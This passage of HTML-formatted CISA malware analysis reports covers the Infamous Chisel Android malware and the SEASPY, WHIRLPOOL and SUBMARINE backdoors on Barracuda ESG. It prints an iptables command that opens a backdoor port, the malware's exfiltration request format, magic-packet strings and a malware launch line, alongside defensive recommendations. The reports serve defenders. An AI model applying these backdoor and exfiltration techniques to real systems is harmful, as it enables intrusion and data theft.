&lt;li&gt;If this request fails or the server doesn’t return the expected data, &lt;code&gt;blob&lt;/code&gt; terminates the execution of &lt;code&gt;td&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;tcpdump&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;tcpdump&lt;/code&gt; utility (version &lt;code&gt;4.1.1&lt;/code&gt;) is compiled for ARM with no obvious modifications. This provides traffic capturing and monitoring functionality via the command line.&lt;/p&gt;
&lt;h3&gt;Multi-call binaries: db, NDBR_armv7l and NDBR_i686&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;db&lt;/code&gt; utility contains multiple individual utilities which are selected based on the command line parameters supplied:&lt;/p&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;

&lt;p&gt;Creates directories&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The command line help for &lt;code&gt;dropbear&lt;/code&gt;, &lt;code&gt;dropbearkey&lt;/code&gt;, &lt;code&gt;nmap&lt;/code&gt; and &lt;code&gt;scp&lt;/code&gt; can be found in the Appendix&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dropbear&lt;/code&gt;, present within &lt;code&gt;db&lt;/code&gt;, provides secure shell access to the device via the Tor hidden service. IP Tables rules configured allow incoming TCP connections destined for port &lt;code&gt;34371&lt;/code&gt; through the firewall. The Tor utility executed by &lt;code&gt;blob&lt;/code&gt; on the device is configured to provide a hidden service on this port, then forward connections to the local &lt;code&gt;dropbear&lt;/code&gt; instance. The &lt;code&gt;.onion&lt;/code&gt; address has already been exfiltrated enabling the actor to connect to it. Modifications have been made to &lt;code&gt;dropbear&lt;/code&gt; authentication mechanisms.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;scp&lt;/code&gt; utility does not appear to have been modified. The &lt;code&gt;nmap&lt;/code&gt; utility has the same functionality as the version in &lt;code&gt;netd&lt;/code&gt; but is executed manually by actor interaction.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt;, &lt;code&gt;rmflag&lt;/code&gt;, and &lt;code&gt;mkflag&lt;/code&gt; utilities appear to be additional actor-created code that has been incorporated to perform some configuration for &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;sessions.log.d&lt;/code&gt; is created under &lt;code&gt;/data/local/tmp/&lt;/code&gt;, and puts all standard Dropbear files under this directory alongside the custom actor file &lt;code&gt;remove_file.flag&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Watchdog&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt; utility performs setup and executes &lt;code&gt;dropbear&lt;/code&gt;. This setup includes:&lt;/p&gt;
&lt;h5&gt;File and directory creation&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;code&gt;remove_file.flag&lt;/code&gt;&amp;nbsp;file is created containing the string &lt;code&gt;run&lt;/code&gt; when any of the multi-call utilities run Dropbear. This will be collected and exfiltrated by&amp;nbsp;&lt;code&gt;netd&lt;/code&gt;&amp;nbsp;giving the actor an indicator that the SSH server is active.&lt;/p&gt;
&lt;h5&gt;Authorized hosts setup&lt;/h5&gt;
&lt;p&gt;A host key is placed into the directory:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;h5&gt;IP Tables Rules&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;/usr/sbin/iptables&lt;/code&gt; is executed with the parameters:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-A INPUT -p tcp --dport 34371 -j ACCEPT -I&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;mkflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;mkflag&lt;/code&gt; utility creates the directories and files that &lt;code&gt;watchdog&lt;/code&gt; creates but does not perform any host file or IP table manipulation, and then runs &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;rmflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;rmflag&lt;/code&gt; utility deletes &lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Modified Dropbear functions&lt;/h4&gt;
&lt;p&gt;The actor has modified authentication mechanisms in Dropbear.&lt;/p&gt;
&lt;h5&gt;fill_passwd&lt;/h5&gt;
&lt;p&gt;The Dropbear function &lt;code&gt;fill_passwd&lt;/code&gt; is used to verify that a supplied username is a valid account and return information required to process authentication.&lt;/p&gt;
&lt;p&gt;The unmodified source code for this can be found in the Appendix (Dropbear fill_passwd function)&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;This function calls multiple Linux library functions, &lt;code&gt;getpwnam&lt;/code&gt;, &lt;code&gt;getspnam&lt;/code&gt;, &lt;code&gt;getpwuid&lt;/code&gt;, but in the modified version actor replacement functions are called instead, each of these are discussed below.&lt;/p&gt;
&lt;h5&gt;getpwnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the passwd file usually stored at &lt;code&gt;/etc/passwd&lt;/code&gt; for the corresponding entry containing the colon concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;username&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user information&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;home directory&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shell program&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;On most modern systems, an &lt;code&gt;x&lt;/code&gt; in the &lt;code&gt;user password&lt;/code&gt; field is used to denote that the password hash is stored in the &lt;code&gt;/etc/shadow&lt;/code&gt; file that requires root privileges to read. On an Android device, there are typically no such files, so the structure that would usually be retrieved from the &lt;code&gt;passwd&lt;/code&gt; file is generated instead.&lt;/p&gt;
&lt;p&gt;The actor has replaced this function with their own, where if a particular username is seen it returns a hard-coded response. If the expected username is not seen, the &lt;code&gt;/etc/passwd&lt;/code&gt; file is checked for the corresponding username as normal.&lt;/p&gt;
&lt;h5&gt;getpwuid&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwuid&lt;/code&gt; Linux library accepts a uid and returns the corresponding structure above typically from the &lt;code&gt;/etc/passwd&lt;/code&gt; file. The actor has replaced this function to check for the &lt;code&gt;uid&lt;/code&gt; of &lt;code&gt;0xbeef&lt;/code&gt; and return the hard-coded structure detailed above, if found. If &lt;code&gt;0xbeef&lt;/code&gt; is not seen, it will revert to checking &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;h5&gt;getspnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getspnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the shadow file usually stored at &lt;code&gt;/etc/shadow&lt;/code&gt; for the corresponding entry that contains the dollar concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;salt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hash&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Typically, on an Android device, this function would return NULL, but the actor replacement function uses the Linux version.&lt;/p&gt;
&lt;p&gt;There does not appear to be any modifications other than those detailed above, but there may be other patches implemented.&lt;/p&gt;
&lt;h4&gt;NDBR&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;NDBR_armv7l&lt;/code&gt; and &lt;code&gt;NDBR_i686&lt;/code&gt; utilities contain multiple individual utilities compiled for ARM and x86 respectively. They both include the above authentication mechanism modification, although with different credentials, and otherwise appear to be the same.&lt;/p&gt;
&lt;p&gt;These utilities also have some functionality overlap with the &lt;code&gt;VPNFilter&lt;/code&gt; malware but appear to be an evolution.&lt;a href="https://www.cisa.gov//blog.talosintelligence.com/vpnfilter-part-3/"&gt;[1]&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;killer&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;killer&lt;/code&gt; is a simple program, the main purpose of which is to terminate &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It achieves this by performing the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Iterates through all Process Identifiers (PIDs) in the range 2 through to &lt;code&gt;0x3FFFFF&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the first line of &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/status&lt;/code&gt; for the string &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the target of the link referenced at &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/exe&lt;/code&gt; against &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the executable name is not &lt;code&gt;netd_&lt;/code&gt; (The legitimate backup executed by the malicious &lt;code&gt;netd&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Terminates the malicious netd leaving the legitimate &lt;code&gt;netd_&lt;/code&gt; running.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;Communications&lt;/h2&gt;

&lt;h3&gt;netd file exfiltration&lt;/h3&gt;
&lt;p&gt;When a file is to be exfiltrated, a Transport Layer Security (TLS) connection is initiated to a hard-coded local IP and port.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This local IP address is likely a local port forward to relay the network traffic over a secure channel, such as a Virtual Private Network (VPN) configured on the device. VPN services are often configured in this way, giving the actor a means to exfiltrate information from the network which blends in with expected encrypted network traffic.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If a connection to the local IP and port fails, a hard-coded domain is used as a fallback connection. The IP address for this domain is resolved using a request to &lt;code&gt;dns.google&lt;/code&gt;.&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /dns-query HTTP/1.1&lt;/p&gt;
&lt;p&gt;Host: dns.google&lt;/p&gt;
&lt;p&gt;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&lt;/p&gt;
&lt;p&gt;Accept: application/dns-message&lt;/p&gt;

&lt;p&gt;Content-Length:&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; The hard-coded user agent that relates to a Microsoft Windows operating system would raise suspicion originating from an Android device. But since all the communications are under TLS, it would make inspecting the HTTP headers difficult.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The following HTTP Post request is used to exfiltrate data:&lt;/p&gt;

&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope="col"&gt;
&lt;p&gt;&lt;strong&gt;Data structure&lt;/strong&gt;&lt;/p&gt;
&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /server.php?ver=16&amp;amp;&lt;strong&gt;bid&lt;/strong&gt;=%s&amp;amp;&lt;strong&gt;type&lt;/strong&gt;=%d HTTP/1.1&lt;/p&gt;
&lt;p&gt;User-Agent: curl/7.47&lt;/p&gt;
&lt;p&gt;Host:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path&lt;/strong&gt;: %s&lt;/p&gt;
&lt;p&gt;Content-Type: application/octet-stream&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Length&lt;/strong&gt;: %d&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Raw File&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Android ID&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Type: 0 or 1&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Base64 encoded file path&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Content Length of the encoded file to be exfiltrated&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;File contents&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&amp;nbsp;The Android ID is generated by the initial script run, using the command &lt;code&gt;settings get secure android_id&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Type&lt;/code&gt; denotes the exfiltration type:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt; is used for the file searches, triage script and configurations files.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt; is used for other information such as the Tor domain.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The Infamous Chisel components are low to medium sophistication and appear to have been developed with little regard to defense evasion or concealment of malicious activity.&lt;/p&gt;
&lt;p&gt;The searching of specific files and directory paths that relate to military applications and exfiltration of this data reinforces the intention to gain access to these networks. Although the components lack basic obfuscation or stealth techniques to disguise activity, the actor may have deemed this not necessary, since many Android devices do not have a host-based detection system.&lt;/p&gt;
&lt;p&gt;Two interesting techniques are present in Infamous Chisel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the replacement of the legitimate &lt;code&gt;netd&lt;/code&gt; executable to maintain persistence.&lt;/li&gt;
&lt;li&gt;the modification of the authentication function in the components that include &lt;code&gt;dropbear&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These techniques require a good level of C++ knowledge to make the alterations and an awareness of Linux authentication and boot mechanisms.&lt;/p&gt;
&lt;p&gt;Even with the lack of concealment functions, these components present a serious threat because of the impact of the information they can collect.&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained a variant of the WHIRLPOOL backdoor. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: CISA Releases Malware Analysis Reports on Barracuda Backdoors.&lt;/p&gt;

&lt;p&gt;The file 'ssld' is a Linux ELF reverse shell and is a variant of WHIRLPOOL malware used on the Barracuda Email Security Gateway (ESG) device (Figure 1). The file looks for an encoded string with a '.io' extension (Figure 2). The string will be decoded and the data will be passed as the C2 which will include the Internet Protocol (IP) address and port number used to establish a reverse shell.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained four malware samples - including SEASPY and WHIRLPOOL backdoors. The device was compromised by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SEASPY is a persistent and passive backdoor that masquerades as a legitimate Barracuda service “BarracudaMailService” that allows the threat actors to execute arbitrary commands on the ESG appliance.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload, a second SEASPY backdoor variant, and the SUBMARINE backdoor, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit Executable and Linkable Format (ELF) file that has been identified as a "SEASPY" malware variant installed as a system service. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor's (TA's) C2 through TCP packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (Simple Mail Transfer Protocol (SMTP)) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". When the right sequence of packets is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument--&lt;/p&gt;

&lt;p&gt;This artifact is an initialization script. Upon its execution it sets terminal settings to default using the 'stty sane' command. It then runs through the process of setting a runlevel variable and stops other services that were started by a previous runlevel. It also kills any services that are running on the current runlevel. Next, the script will start its associated services at the current runlevel. After logging functionalities are started, the script will then check if the runlevel is 3, which will result in the terminal screen being cleared using /usr/bin/clear. Finally, the script contains the command “/sbin/BarracudaMailService eth0” at the end. BarracudaMailService will be started automatically when the initialization script is run on the network interface eth0. BarracudaMailService is a known name for the SEASPY backdoor.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This variant of SEASPY has had its symbols stripped. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the TA's C2 through TCP packets.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "TfuZ". When the right sequence of packets is captured this SEASPY variant launches an authentication sequence prior to launching the reverse shell. Once the TA authenticates, the malware starts a reverse shell on the infected system. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument--&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 32-bit ELF file that has been identified as a malware variant named "WHIRLPOOL". The malware takes two arguments (C2 IP and port number) from a module to establish a Transport Layer Security (TLS) reverse shell. The module that passes the arguments was not available for analysis.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained two SEASPY malware samples. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SEASPY is a persistent and passive backdoor that masquerades as a legitimate Barracuda service “BarracudaMailService” that allows the threat actors to execute arbitrary commands on the ESG appliance.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. The sample is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor’s (TA) Command-and-Control (C2) through Transmission Control Protocol (TCP) packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". Note: This hard-coded string may change for other SEASPY variants. When the right sequence of packet is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument—&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument—&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This sample has the sample malicious capabilities as BarracudaMailService.2 (5d6cba7909980a7b424b133fbac634ac). The only difference between the binaries is located in the function named "start_pcap_listener". In the function "start_pcap_listener" both binaries call a function named "reverse shell" to start the reverse shell functionality of the malware. The difference is that BarracudaMailService.1 (32ffe48d1a8ced49c53033eb65eff6f3) jumps directly to the set of instructions that start the reverse shell, as opposed to BarracudaMailService.2 (5d6cba7909980a7b424b133fbac634ac), which contains an extra set of instructions before jumping to the instructions that start the reverse shell.&lt;/p&gt;
&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained seven malware samples related to a novel backdoor CISA has named SUBMARINE. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting certain versions 5.1.3.001 - 9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SUBMARINE is a novel persistent backdoor that lives in a Structured Query Language (SQL) database on the ESG appliance. SUBMARINE comprises multiple artifacts that, in a multi-step process, enable execution with root privileges, persistence, command and control, and cleanup. In addition to SUBMARINE, CISA obtained associated Multipurpose Internet Mail Extensions (MIME) attachment files from the victim. These files contained the contents of the compromised SQL database, which included sensitive information.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
